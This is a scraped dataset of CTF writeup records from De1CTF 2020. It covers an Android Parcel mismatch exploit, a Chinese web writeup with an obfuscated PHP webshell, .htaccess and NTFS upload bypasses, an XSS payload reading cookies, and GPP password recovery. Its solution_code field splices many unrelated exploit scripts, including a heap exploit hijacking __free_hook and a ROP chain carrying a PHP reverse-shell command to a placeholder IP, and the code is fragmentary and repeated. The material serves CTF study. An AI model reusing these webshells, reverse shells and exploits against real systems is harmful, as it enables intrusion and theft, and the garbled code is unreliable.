`BaseBundle.writeToParcelInner`:\n```java\nint lengthPos = parcel.dataPosition();\nparcel.writeInt(-1); // dummy, will hold length\nparcel.writeInt(BUNDLE_MAGIC);\nint startPos = parcel.dataPosition();\nparcel.writeArrayMapInternal(map);\nint endPos = parcel.dataPosition();\n// Backpatch length\nparcel.setDataPosition(lengthPos);\nint length = endPos - startPos;\nparcel.writeInt(length);\nparcel.setDataPosition(endPos);\n```\n\n`pacel.writeArrayMapInternal` will write the number of hashmap, then key and value.\n```java\n/**\n   * Flatten an ArrayMap into the parcel at the current dataPosition(),\n   * growing dataCapacity() if needed.  The Map keys must be String objects.\n   */\n  /* package */ void writeArrayMapInternal(ArrayMap<String, Object> val) {\n...\n      final int N = val.size();\n      writeInt(N);\n     ... \n      int startPos;\n      for (int i=0; i<N; i++) {\n          if (DEBUG_ARRAY_MAP) startPos = dataPosition();\n          writeString(val.keyAt(i));\n          writeValue(val.valueAt(i));\n...\n```\n\n`writeValue` will write the type and value. If the type is Parceable, writing will call `writeParcelable` method, which call `writeToParcel` in `Parcelable` object.\n\n```java\npublic final void writeValue(Object v) {\n        if (v == null) {\n            writeInt(VAL_NULL);\n        } else if (v instanceof String) {\n            writeInt(VAL_STRING);\n            writeString((String) v);\n        } else if (v instanceof Integer) {\n            writeInt(VAL_INTEGER);\n            writeInt((Integer) v);\n        } else if (v instanceof Map) {\n            writeInt(VAL_MAP);\n            writeMap((Map) v);\n        } else if (v instanceof Bundle) {\n            // Must be before Parcelable\n            writeInt(VAL_BUNDLE);\n            writeBundle((Bundle) v);\n        } else if (v instanceof PersistableBundle) {\n            writeInt(VAL_PERSISTABLEBUNDLE);\n            writePersistableBundle((PersistableBundle) v);\n        } else if (v instanceof Parcelable) {\n            // IMPOTANT: cases for classes that implement Parcelable must\n            // come before the Parcelable case, so that their specific VAL_*\n            // types will be written.\n            writeInt(VAL_PARCELABLE);\n            writeParcelable((Parcelable) v, 0);\n```\n\nWe can use this code to get the bytes from marshal.\n```java\nBundle bundle = new Bundle();\nbundle.putParcelable(AccountManager.KEY_INTENT, new MainActivity$Message()));\nbyte[] bs = {'a', 'a','a', 'a'};\nbundle.putByteArray(\"AAA\", bs);\nParcel testData = Parcel.obtain();\nbundle.writeToParcel(testData, 0);\nbyte[] raw = testData.marshall();\n```\n![](./1.png)\n\n`writeString`will put '\\0' to the end of string. \nPAD_SIZE will make the length of unit be the multipiles of 4.\n\n### Exploit\n`MainActivity$Message` is a class implementing from `Parceable`.\nThere are two type-difference:\n1. \n```\nthis.txRate = in.readInt();\ndest.writeByte((byte) this.txRate);\n```\n2. \n```\nthis.rttSpread = in.readLong();\ndest.writeInt((int) this.rttSpread);\n```\n\nThrough test I found that the first type-difference which in byte and int will not create influence, because of PAD_SIZE.\nSo the second type-difference will cover 4 bytes after `Message` object every times `readFromParcel` and `writeToParcel`.\n\n", "solution_code": "", "tools": ["radare2"], "file_path": "temp_repos\\r3kapig_writeup\\20200507-De1taCTF-BroadcastTest\\README.md", "file_size": 11029, "scraped_at": "2025-10-26T18:19:25.884001"}
{"id": "r3kapig_writeup_de1ctf_2020_Writeup", "team": "r3kapig", "repo": "writeup", "challenge_name": "de1ctf 2020 Writeup", "attack_type": "Hash", "writeup": "# de1ctf 2020 Writeup\n\n## web\n\n### check in\n\n考察上传绕过，一是在上传`.htaccess`时对关键字进行绕过，二是在传马时对`<?php`进行绕过。\n构造.htaccess如下：\n\n```\nAddType application/x-httpd-p\\\nhp .jpg\n```\n\n将`jpg`解析为php，绕过关键字过滤上传。\n由于是`php5.4`可以利用`<?=`替代`<?php`，上传一句话即可。\n\n### Hard_pentest_1\n\n![](https://i.imgur.com/oO25Nh7.png)\n\nBurpsuite观察到服务器是Windows，可以用ntfs流绕php后缀`shell.php::$DATA`\n\nshell参考这篇文章：https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html#\\_4\n\n```php\n<?=$_=[]?><?=$_=@\"$_\"?><?=$_=$_['!'!='@']?><?=$__=$_?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$_ = $__['!'!='@']?><?= =$__=$_?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$___ = $__?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$___ .=$__?><?=$__=$_?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$___ .= $__?><?=$__++?><?=$___.=$__?><?=$__=$_?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$___.=$__?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$___.=$__?><?=$_=[]?><?=$_=@\"$_\"?><?=$_=$_[@'!'=='@']?><?=$____='_'?><?=$__=$_?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$____.=$__?><?=$__=$_?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$____.=$__?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$____.=$__?><?=$__++?><?=$____.=$__?><?=$_=$$____?><?=$___($_[_])?>\n```\n\n上传该shell之后，再写入一个普通的shell，即可蚁剑连接，并且上传nc反弹shell。\n\n共享文件里有压缩包需要密码。\n\n同时组策略泄漏了组管理员密码。\n![](https://i.imgur.com/7CI5tlJ.png)\n\n解密脚本参考文章：https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/\n\n![](https://i.imgur.com/7EpeHuU.png)\n\n\n### Animal Crossing\n\n比赛期间没做出来，结束了突然有点思路了\n\n绕ast+静态。window对象所有方法都能调，同时封锁了属性的调用\n\nopen可用，调到子页面直接打opener的资源就能避开父的属性调用了\n\n```\nhttp://134.175.231.113:8848/passport?image=%2Fstatic%2Fhead.jpg&island=aa&fruit=aa\"&name=url&data=amF2YXNjcmlwdDphbGVydChvcGVuZXIuZG9jdW1lbnQuY29va2llKQ==%27%3b%0aopen(atob(data))%3b%2F%2F\n```\n\n![-w442](https://i.loli.net/2020/05/08/q6T7nuFHUOYvip2.jpg)\n\n看到有一半flag肯定后面还有东西。打一下源码，看看hint里的admin行为是想表达个啥\n\n```\n<img src=\"/island/test_01.png\" class=\"island-img\">\n<img src=\"/island/test_02.png\" class=\"island-img\">\n<img src=\"/island/test_03.png\" class=\"island-img\">\n<img src=\"/island/test_04.png\" class=\"island-img\">\n<img src=\"/island/test_05.png\" class=\"island-img\">\n<img src=\"/island/test_06.png\" class=\"island-img\">\n<img src=\"/island/test_07.png\" class=\"island-img\">\n<img src=\"/island/test_08.png\" class=\"island-img\">\n<img src=\"/island/test_09.png\" class=\"island-img\">\n<img src=\"/island/test_10.png\" class=\"island-img\">\n<img src=\"/island/test_11.png\" class=\"island-img\">\n<img src=\"/island/test_12.png\" class=\"island-img\">\n<img src=\"/island/test_13.png\" class=\"island-img\">\n<img src=\"/island/test_14.png\" class=\"island-img\">\n<img src=\"/island/test_15.png\" class=\"island-img\">\n<img src=\"/island/test_16.png\" class=\"island-img\">\n<img src=\"/island/test_17.png\" class=\"island-img\">\n<img src=\"/island/test_18.png\" class=\"island-img\">\n<img src=\"/island/test_19.png\" class=\"island-img\">\n<img src=\"/island/test_20.png\" class=\"island-img\">\n<img src=\"/island/test_21.png\" class=\"island-img\">\n<img src=\"/island/test_22.png\" class=\"island-img\">\n<img src=\"/island/test_23.png\" class=\"island-img\">\n<img src=\"/island/test_24.png\" class=\"island-img\">\n<img src=\"/island/test_25.png\" class=\"island-img\">\n<img src=\"/island/test_26.png\" class=\"island-img\">\n<img src=\"/island/test_27.png\" class=\"island-img\">\n<img src=\"/island/test_28.png\" class=\"island-img\">\n<img src=\"/island/test_29.png\" class=\"island-img\">\n<img src=\"/island/test_30.png\" class=\"island-img\">\n<img src=\"/island/test_31.png\" class=\"island-img\">\n<img src=\"/island/test_32.png\" class=\"island-img\">\n<img src=\"/island/test_33.png\" class=\"island-img\">\n<img src=\"/island/test_34.png\" class=\"island-img\">\n<img src=\"/island/test_35.png\" class=\"island-img\">\n<img src=\"/island/test_36.png\" class=\"island-img\">\n<img src=\"/island/test_37.png\" class=\"island-img\">\n<img src=\"/island/test_38.png\" class=\"island-img\">\n<img src=\"/island/test_39.png\" class=\"island-img\">\n<img src=\"/island/test_40.png\" class=\"island-img\">\n<img src=\"/island/test_41.png\" class=\"island-img\">\n<img src=\"/island/test_42.png\" class=\"island-img\">\n<img src=\"/island/test_43.png\" class=\"island-img\">\n<img src=\"/island/test_44.png\" class=\"island-img\">\n<img src=\"/island/test_45.png\" class=\"island-img\">\n<img src=\"/island/test_46.png\" class=\"island-img\">\n<img src=\"/island/test_47.png\" class=\"island-img\">\n<img src=\"/island/", "solution_code": "from pwn import *\nr=remote(\"134.175.239.26\",\"8848\")\n\nlibc = ELF(\"./libc-2.27.so\")\ndef mmenu(idx):\n    r.sendlineafter(\">> \",str(idx))\n\ndef add(typ,data):\n    mmenu(str(typ))\n    mmenu(1)\n    r.sendafter(\"input data:\",data)\ndef free(typ,idx):\n    mmenu(str(typ))\n    mmenu(2)\n    if typ<3:\n        r.sendlineafter(\"index?\",str(idx))\ndef show(typ,idx):\n    mmenu(str(typ))\n    mmenu(3)\n    r.sendlineafter(\"index?\",str(idx))\n\nadd(2,'aaa')\nadd(2,'ccc')\nfor i in range(1,5):\n    if i != 2:\n        add(i,'a')\n        add(i,'a')\nfor i in range(1,5):\n    if i != 2:\n        free(i,1)\n        free(i,0)\n\nfree(2,0)\nshow(2,0)\nr.recvuntil(\"data: \")\nlibc.address = u64(r.recvline()[:-1].ljust(8,'\\x00'))-0x3ebca0\nfor i in range(2,4):\n    if i != 2:\n        add(i,'a')\n        add(i,'/bin/sh\\x00')\nadd(2,'ccc')\nfree(2,0)\nfree(2,0)\nadd(2,p64(libc.sym['__free_hook']))\nadd(1,p64(libc.sym['system']))\nfree(3,0)\nfree(3,0)\n\nr.interactive()\n\nm = [122,25,79,110,14,86,175,31,152,88,14,96,189,66,138,162,32,151,176,61,135,160,34,149,121,249,65,84,12,109]\nprint len(m)\n\nfor i in range(0,30,3):\n    byte0 = m[i] ^ m[i+2]\n    byte0 &= 0xff\n    byte1 = m[i+1] + byte0\n    byte1 &= 0xff\n    byte2 = m[i+2] - m[i+1]\n    byte2 &= 0xff\n    m[i] = byte0 & 0xff\n    m[i+1] = byte1 & 0xff\n    m[i+2] = byte2 & 0xff\nans = ''\nfor i in range(30):\n    ans += chr(m[i])\nprint ans\n\nbase_t = '0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm+/='\nbase_t_l = len(base_t)\nsum = 0\nflag = ''\nfor i in range(30):\n    idx = 0\n    for j in range(base_t_l):\n        if ans[i] == base_t[j]:\n            idx = j\n            break\n    sum = sum * 58 + idx\n    if (i % 3 ==2):\n        flag += binascii.a2b_hex(hex(sum)[2:])\n        print hex(sum)\n        sum = 0\nprint flag\n\n\nkey_list = [\n    [],[],[],.........\n]    # 44 * 44\ncheck_list = [ .... ]   #44\nflag = 1\nfor i in range(44):\n    key = key_list[i]\n    b = 0\n    for j in range(44):\n        in_b = input[j]\n        key_b = key[j]\n        for k in range(8):\n            if( key_b & 1 ):\n                b ^= in_b\n            if( in_b & 0x80 ):\n                in_b = 2 * in_b ^ 0x39\n            else:\n                in_b = 2 * in_b\n            key_b >>= 1\n    if b != check_list[i]:\n        flag = 0\n\nfrom z3 import *\n\ndef n2b(x):\n    a = []\n    for i in range(32):\n        a.append(x % 2)\n        x /= 2\n    return a\n\nna, nb, nc, nd = 19, 19, 13, 6\nvar_a = [Bool(\"a%d\" % i) for i in range(na)]\nvar_b = [Bool(\"b%d\" % i) for i in range(nb)]\nvar_c = [Bool(\"c%d\" % i) for i in range(nc)]\nvar_d = [Bool(\"d%d\" % i) for i in range(nd)]\n\ndef build_init(num):\n    a = [[0] * num for i in range(32)]\n    for i in range(min(32,num)):\n        a[i][i] = 1\n    return a\n\nnow_a = build_init(na)\nnow_b = build_init(nb)\nnow_c = build_init(nc)\nnow_d = build_init(nd)\n\nwith open(\"data\") as f:\n    data = list(map(int, f.readline().strip()))\n\nma, mb, mc, md = map(n2b, (0x505a1, 0x40f3f, 0x1f02, 0x31))\n\ndef myxor(a, b):\n    #assert len(a)==len(b)\n    return [a[i] ^ b[i] for i in range(len(a))]\n\ndef lfsr(a, m):\n    ans = [[] for i in range(32)]\n    for i in range(1,32):\n        ans[i] = a[i - 1]\n    tmp = [0] * len(a[0])\n    for i in range(32):\n        if m[i] == 1:\n            tmp = myxor(tmp, a[i])\n    ans[0] = tmp\n    return ans\n\ndef buildxor(var, a):\n    ans = False\n    for i in range(len(a)):\n        if a[i] == 1:\n            ans = Xor(ans, var[i])\n    return ans\n\ndef combine():\n    global now_a, now_b, now_c, now_d, ma, mb, mc, md\n    now_a = lfsr(now_a, ma)\n    now_b = lfsr(now_b, mb)\n    now_c = lfsr(now_c, mc)\n    now_d = lfsr(now_d, md)\n    a0 = buildxor(var_a, now_a[0])\n    b0 = buildxor(var_b, now_b[0])\n    c0 = buildxor(var_c, now_c[0])\n    d0 = buildxor(var_d, now_d[0])\n    return Or(And(a0, b0), And(Not(b0), Xor(c0, d0)))\n\nsolve = Solver()\nfor i in range(min(len(data), 1000)):\n    print(i)\n    t = combine()\n    solve.add(t if data[i]==1 else Not(t))\nprint(solve)\nprint(solve.check())\nmodel = solve.model()\nprint(model)\n\nfrom sage.all import *\nfrom pwn import *\nfrom hashlib import sha256\nimport random, string\nimport codecs\nfrom Crypto.Util.number import bytes_to_long\n\nq = 0xdd7860f2c4afe6d96059766ddd2b52f7bb1ab0fce779a36f723d50339ab25bbd\na = 0x4cee8d95bb3f64db7d53b078ba3a904557425e2a6d91c5dfbf4c564a3f3619fa\nb0 = 0x56cbc73d8d2ad00e22f12b930d1d685136357d692fa705dae25c66bee23157b8\nfield = GF(q)\ncurve0 = EllipticCurve(field, [a,b0])\n\nprimes = []\ngood_b = []\n\ndef find_prime(num):\n    global primes\n    limit = 100000\n    slimit = 100\n    while True:\n        x = trial_division(num, limit)\n        if x == num:\n            return 0\n        if x > slimit and x not in primes:\n            return x\n        num /= x\n\"\"\"\nprod_primes = 1\nwhile True:\n    b = field.random_element()\n    curve = EllipticCurve(field, [a,b])\n    num = curve.cardinality()\n    p = find_prime(num)\n    if p != 0:\n        primes.append(p)\n        good_b.append(b)\n        print(b, p)\n        prod_primes *= p\n        if prod_primes > q:\n            break\nprint(good_b)\nprint(primes)\n\"\"\"\n\ngood_b = [6211086815011563067620296699263883972509369396999995302441539455496168622279,\n 98574452757002781783654213495931056883939295347317250205181146329494800676987,\n 87620687935359399908622892998617361658458401834916224453442868851408379289438,\n 65086183749031692453132440274510001138946531322251783223436152949357168702101,\n 46021703287063012097535158344315852578288792152338955276762336204655785703272,\n 55290385593809045586041069311939346961675411126152634019347481812491795288303,\n 87619460816503284587802610883799611592764073598808416496296166011557682550255,\n 20587915430822896519925252084987775347053226113504729908243979761922350194076,\n 8431127641146869895830619497631705992133861543907167102073129469555247540411,\n 72468403213185949431860137197984824137277628176195015746227422957521394676938,\n 62477922485214300600210481151431403396481715852508541015009686763485217204376,\n 2461097140264877184602960042153986475948757748737511275579273536314357774455,\n 52838986369268354399576299386497034405631000959595849861038852829374605724186,\n 86449577338760902484545961462235993087119069610730090900228062112247987488276,\n 93370252582075567605700397171132502753354843346459110919318579649577858331707,\n 33521709848079075367861170558864696456337661027939445036411400565277609897460,\n 36751221215551704172177475140942474141885663956592566340914945275246699332067,\n 35206252668125338121854612073172440870920181137870760968354503478219656581844,\n 30803252885377359748855249043620997912969167347566879519532967182292487052309,\n 71723857802697127056254221655374457039601178429445181744952265211749812716407,\n 84440413960958962355810939609173041967577265336202346661096261207497914589195,\n 99739869036402627989911681764960079998973009086032898863155562454511401401600,\n 12803293455235132143163029402376557032938441696712251760407626953815229385756,\n 99190990366909263866322135175653748341931762174475579305189953098675271672684,\n 17613623221177901583167094460961738253367313920535409663458707894484429207051]\nprimes = [2179, 1289, 59999, 30259, 113, 2879, 1181, 967, 659, 101, 5449, 227, 271, 23669, 317, 3989, 547, 167, 751, 12457, 983, 269, 457, 1277, 86599]\n\nn = len(good_b)\ncurves = []\nfor i in range(n):\n    curves.append(EllipticCurve(field, [a, good_b[i]]))\n\npoints = [(19507340931189973568970534354346675790660489762463850256460500717283946261836, 93990986852291510741552362898292362153088730070276870172288419312934861060443), (28054202204080435654185626699590118012041849935670790888142479053885296554769, 65263191418667493074958784939105580722524953377895465589805829613231371260761), (19570113117206968931041461825359841635154708132893840274912509868663111066055, 34861736386744152249641750097691296936161875795323328010906578876540223102867), (33388964031225647753658029329629878266463218727954841418700248047371661736053, 90361586139917610370159763883369565805713212527920403273386189235983585562743), (66700790350207354737852013222385488367498981573233379904437853631717043448547, 53433408083666386534739553623370765372323686554370314300461422960727091694924), (36281323235605439303424711969604228819253455717300370339472440863583798921747, 89333075334215107563917563532536759593693082972899271521968161088671976288092), (24898771388008938378671397098037276299001299298558179332046761459119813933208, 60157824174292914357907617012784233148535109635888926712493355114443684410242), (41024842272459113591038406867847701260219120913143525871455120954725085815388, 58080663589581142504473489403185052460849908517621917171065862560693740117488), (44877839753880210170426316074475704017688393591895232633465680932056165426108, 16637391968836021868062256428444034583180361666267818812297923545223531374906), (9213004151061951383151318314265271108777938482780831941654814187659115347886, 11228777849799372233846801614232594742279770274180260153160807304484971904264), (48643305686563148479162697336870778051714568931350429397807207503680876755497, 11195641711169844792310025421834391460453387017937786699885654091495296207043), (1698615000299687838648146942270648895141070165499143965557282372482965747112, 92569310096599508172798587722411817818074417408181334875149071535920735447292), (89935055566882410026353986317893095604898893132013616740671092603082845878572, 43502660097223071441728238468509061422820080712250114528659957352951916779994), (48056015661830589709097512930877649812778054373210479825115615986276908078753, 19618098018003216997623948377351727960824032255044568182472217742720133385651), (93761147474070978486072670079787938982982789958802141020754905539581891787306, 88010231672503149200294157470647905088886902144549803873108630549395091840275), (92020668575688499794016000549051660826892090181832905239230804713279441917958, 30110506624063128411566588628476581431326295832322077660437857357626639718987), (44809345422891960257530727200370127012697279930443588929057473411421246871992, 88545270496688963328321986899568632277665741441711074441024187438963389363897), (13076106146633904709359888905193226187967735552055658529027341002932457572814, 80372346494606386901236287105868984286890847036067050266743919277423665456135), (55907782788450924012146412683706088533171253022693607550089447952215419312846, 3751516562614392695911378044870039330350823342073921223753336327462679673674), (47051129916073582188659668685945994754626518455721110919136386190138499276471, 86704825096586057708845977585742183545462737899909346286882311991113257296140), (81621390336051571271375962201675607332094248443293624702225955356975450394838, 62848412712613880537361968249181467640248592602903157605441011622878154021187), (28068769009810651156082373576237044558982030816550630080563930970321395346474, 19692854947437892925207214399032477726928042246514722730356145177501099769534), (35948452792200094240506018863073321272868570672393239428399789400279043435798, 76267546729736502626578895970729012855904970704453897303449164923661935193761), (40433612828564862678329442593693250130220784327522208224488063346825116554334, 20721954396231306197017431006852550862189546642228084462958643733119955101666), (26739431417888933616685141927426627849471810811576883518571031672580867716174, 43592843242668872950809571417365447079940129342363899108923060420461318436125)]\n\n\"\"\"\nfor i in range(n):\n    print(\"try\",i)\n    curve = curves[i]\n    m = curve.cardinality()\n    assert m%primes[i]==0\n    if len(points) > i:\n        h = curve(points[i][0], points[i][1])\n        assert h.order() == primes[i]\n        continue\n    while True:\n        h = curve.random_element()\n        h = (m // primes[i]) * h\n        if h.order() == primes[i]:\n            break\n    points.append((h[0], h[1]))\n    print(points)\n\"\"\"\n\ndef curve_div(pa,pb):\n    ans = 0\n    pt = 0*pb\n    while pt != pa:\n        pt = pt + pb\n        ans = ans + 1\n    return ans\n\ncontext.log_level = \"debug\"\nrt = remote(\"134.175.225.42\", 8848)\n#rt = remote(\"localhost\", 8848)\n\ndef proof():\n    line = rt.recvline().decode()\n    s0 = line[line.find('+')+1:line.find(')')]\n    s1 = line[line.find('==')+3:].strip()\n    print(s0,s1,type(s1))\n    while True:\n        s = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(4))\n        if sha256((s+s0).encode()).hexdigest() == s1:\n            rt.sendline(s)\n            break\n\nproof()\nrt.recvuntil(\"are: \\n\")\nrt.recvline() # q\nrt.recvline() # a\nrt.recvline() # b\nrt.recvline() # P\nQ = rt.recvline() # Q\nQ = eval(Q[3:])\nQ = curve0(Q)\nprint(Q)\n\nrt.sendline(\"0\")\nrt.sendline(\"0\")\n\ndivs = []\n\nfor i in range(n):\n    rt.recvuntil(\"choice\")\n    rt.sendline(\"Exchange\")\n    rt.recvuntil(\"X:\")\n    rt.sendline(str(points[i][0]))\n    rt.recvuntil(\"Y:\")\n    rt.sendline(str(points[i][1]))\n    rt.recvuntil(\"choice\")\n    rt.sendline(\"Encrypt\")\n    rt.recvuntil(\"message\")\n    rt.sendline('ff'*64)\n    rt.recvuntil(\"is:\\n\")\n    result = rt.recvline().strip()\n    result = bytes_to_long(codecs.decode(result, 'hex'))\n    result ^= (1 << 512) - 1\n    x = result >> q.bit_length()\n    y = result - (x << q.bit_length())\n    curve = curves[i]\n    key = curve(x,y)\n    h = curve(points[i][0], points[i][1])\n    d = curve_div(key, h)\n    divs.append(d)\n\nsecret = CRT_list(divs, primes)\nrt.recvuntil(\"choice\")\nrt.sendline(\"Backdoor\")\nrt.recvuntil(\"secret\")\nrt.sendline(str(secret))\nprint(rt.recvall())\n\nrt.recvuntil(\"flag is: \\n\")\nenc = []\nfor i in range(44):\n        f1 = eval(rt.recvline())\n        f2 = eval(rt.recvline())\n        enc.append([f1,f2])\n\nans = \"\"\nfor i in range(44):\n        rt.recvuntil(\"choice\")\n        rt.sendline(\"Decrypt\")\n        c0, c1 = enc[i]\n        c0 = (Q(c0) + genError()).list()\n        rt.recvuntil(\"c0\")\n        rt.sendline(','.join(map(str, c0)))\n        rt.recvuntil(\"c1\")\n        rt.sendline(','.join(map(str, c1)))\n        rt.recvuntil(\"index\")\n        rt.sendline('0')\n        rt.recvuntil('result is: \\n')\n        a = rt.recvline()\n        ans += chr(int(a))\nprint(ans)\n\na=open('bgm.mp3','rb').read()\na=[ord(i) for i in a]\n\ni=0x28a3\ntmp1=''\n\nfor _ in range(3285):\n    tmp1+=str(a[i+2]%2)\n    i+=0x1a1\n\ntmp1 = '0b' + tmp1[::-1]\nprint hex(int(tmp1,2))[2:-1].decode('hex')\n\n    global INITIAL, php_base, minclude_base, libc_base\n    if len(sys.argv) < 2:\n        print('usage: {} path'.format(sys.argv[0]))\n        return\n\n\n        system = libc_base + 0x449c0\n        halt = p64(pop_rdi) + p64(jmp_rdi) + p64(jmp_rdi)\n        def write(addr, val):\n            assert len(val) == 8\n            return p64(pop_rdi) + p64(addr) + p64(pop_rsi) + val + p64(mov_to_rdi)\n        area = minclude_base + 0x4000\n        cmd = b\"php -r '$sock=fsockopen(\\\"X.X.X.X\\\",52333);exec(\\\"/bin/sh -i <&3 >&3 2>&3\\\");'\"\n        cur = 0\n        rop = b''\n        buf = cmd[:8]\n        rop += write(area, buf)\n        cur += 8\n        buf = cmd[8:16]\n        rop += write(area + 8, buf)\n        cur += 8\n        rop += p64(pop_pop)\n        rop += p64(0xdeadbeef)\n        rop += p64(0xdeadbeef)\n\n\n    #url = \"http://134.175.185.244/select.php\"\n    if debug:\n        url = \"http://localhost:51111/select.php\"\n    else:\n        #url = \"http://49.51.251.99/select.php\"\n        url = \"http://134.175.185.244/select.php\"\n    r = requests.post(url, data=data, headers=headers)\n    if not exp:\n        f = open(save_filename, \"wb\")\n        f.write(r.content[INITIAL:])\n        f.close()\n    else:\n        print(r.content)\n\n\n    fn next(&mut self) -> Option<Summary> {\n        if self.n == 16 {\n            None\n        } else {\n            let mut buf = [0u8; 4];\n            loop {\n                self.pos -= 4;\n                self.reader.seek(SeekFrom::Start(self.pos)).unwrap();\n                self.reader.read_exact(&mut buf).unwrap();\n                if is_fn_start(&buf) {\n                    self.n += 1;\n                    println!(\"function at 0x{:x}\", self.pos);\n                    return Some(Summary::new(&mut self.reader));\n                }\n            }\n        }\n    }\n\n\n            if let Some(v) = li_val(&cur) {\n                s.comps.push(v);\n            } else if let Some(v) = addiu_val(&cur) {\n                if v <= 3 {\n                    s.idxs.push(v as usize);\n                    ignore_lbu += 1;\n                }\n            } else if is_lbu(&cur) {\n                s.lbu_cnt += 1;\n                if ignore_lbu > 0 {\n                    ignore_lbu -= 1;\n                } else {\n                    s.idxs.push(0);\n                }\n            } else if is_andi(&cur) {\n                s.andi_cnt += 1;\n            } else if is_beq(&cur) {\n                println!(\"cur {:?} {}\", cur, i);\n                s.beq_cnt += 1;\n                if s.bne_cnt == 0 {\n                    s.beq_first = true;\n                }\n            } else if is_addu(&cur) {\n                s.addu_cnt += 1;\n            } else if is_bne(&cur) {\n                s.bne_cnt += 1;\n            } else if is_mult(&cur) {\n                s.mult_cnt += 1;\n            } else if is_xor(&cur) {\n                s.xor_cnt += 1;\n            }\n        }\n\n\n        let mut sol = [0u8; 4];\n        println!(\"summary: {:?}\", s);\n        if s.beq_first {\n            // v1 < v2\n            println!(\"v1 < v2\");\n            if s.beq_cnt == 2 {\n                // v1 < v2\n                println!(\"v1 < v2\");\n                sol[i] = 0;\n                sol[(i + 1) % 4] = 1;\n                sol[(i + 2) % 4] = 2;\n                sol[(i + 3) % 4] = 0;\n            } else if s.bne_cnt == 1 && s.beq_cnt == 1 {\n                // v2 < v1\n                println!(\"v2 < v1\");\n                sol[i] = 0;\n                sol[(i + 1) % 4] = 2;\n                sol[(i + 2) % 4] = 1;\n                sol[(i + 3) % 4] = 0;\n            } else {\n                panic!(\"summary error\");\n            }\n        } else {\n            // v2 < v1\n            println!(\"v2 < v1\");\n            if s.bne_cnt == 2 {\n                // v2 < v1\n                println!(\"v2 < v1\");\n                sol[i] = 2;\n                sol[(i + 1) % 4] = 0;\n                sol[(i + 2) % 4] = 0;\n                sol[(i + 3) % 4] = 1;\n            } else if s.bne_cnt == 1 && s.beq_cnt == 1 {\n                // v1 < v2\n                println!(\"v1 < v2\");\n                sol[i] = 1;\n                sol[(i + 2) % 4] = 0;\n                sol[(i + 1) % 4] = 0;\n                sol[(i + 3) % 4] = 2;\n            } else {\n                panic!(\"summary error\");\n            }\n        }\n\n\n    let mut i = 0;\n    for s in FunctionIter::new(reader, first) {\n        print!(\"solving {}...  \", i);\n        let mut solved = false;\n        for p in patterns.iter() {\n            if p.validate(&s) {\n                println!(\"pattern: {}\", p.what());\n                solved = true;\n                answer.extend_from_slice(&p.solve(&s));\n            }\n        }\n\n\n    # Your exploit script goes here\n    p.rl()\n    cond = p.rl()\n    found = False\n    for i in range(255):\n        print(i)\n        if found:\n            break\n        for j in range(255):\n            if found:\n                break\n            for k in range(255):\n                s = bytes([i, j, k])\n                if eval(cond):\n                    print(s)\n                    p.ru('>')\n                    p.sl(s)\n                    found = True\n                    break\n    cur = datetime.datetime.now()\n    p.ru(b'Binary Dump:\\n')\n    binary = p.ru('\\n===')[:-3]\n    binary = base64.b64decode(binary)\n    binary = gzip.decompress(binary)\n    p.ru('Faster > \\n')\n    try:\n        regex = b\"\\xe0\\xff\\xbd\\x27\\x1c\\x00\\xbf\\xaf\\x18\\x00\\xbe\\xaf\\x25\\xf0\\xa0\\x03\\x20\\x00\\xc4\\xaf\\x20\\x00\\xc4\\x8f\"\n        first = binary.index(regex)\n        answer = bytes(solver.solve(binary, first))\n        p.s(answer)\n        #p.ru('Name\\n')\n        p.s('AAnciety')\n        #p.ru('come')\n        p.s(stage1)\n    except:\n        pass\n    cur = datetime.datetime.now() - cur\n\n\n    p.s(stage2)\n    print(cur)\n\n\n    idx = 0\n    for j in range(base_t_l):\n        if ans[i] == base_t[j]:\n            idx = j\n            break\n    sum = sum * 58 + idx\n    if (i % 3 ==2):\n        flag += binascii.a2b_hex(hex(sum)[2:])\n        print hex(sum)\n        sum = 0\n\n\n    print(i)\n    t = combine()\n    solve.add(t if data[i]==1 else Not(t))\n\n\n    b = field.random_element()\n    curve = EllipticCurve(field, [a,b])\n    num = curve.cardinality()\n    p = find_prime(num)\n    if p != 0:\n        primes.append(p)\n        good_b.append(b)\n        print(b, p)\n        prod_primes *= p\n        if prod_primes > q:\n            break\n\n\n    print(\"try\",i)\n    curve = curves[i]\n    m = curve.cardinality()\n    assert m%primes[i]==0\n    if len(points) > i:\n        h = curve(points[i][0], points[i][1])\n        assert h.order() == primes[i]\n        continue\n    while True:\n        h = curve.random_element()\n        h = (m // primes[i]) * h\n        if h.order() == primes[i]:\n            break\n    points.append((h[0], h[1]))\n    print(points)\n\n\n    line = rt.recvline().decode()\n    s0 = line[line.find('+')+1:line.find(')')]\n    s1 = line[line.find('==')+3:].strip()\n    print(s0,s1,type(s1))\n    while True:\n        s = ''.join(random.choice(string.ascii_letters + 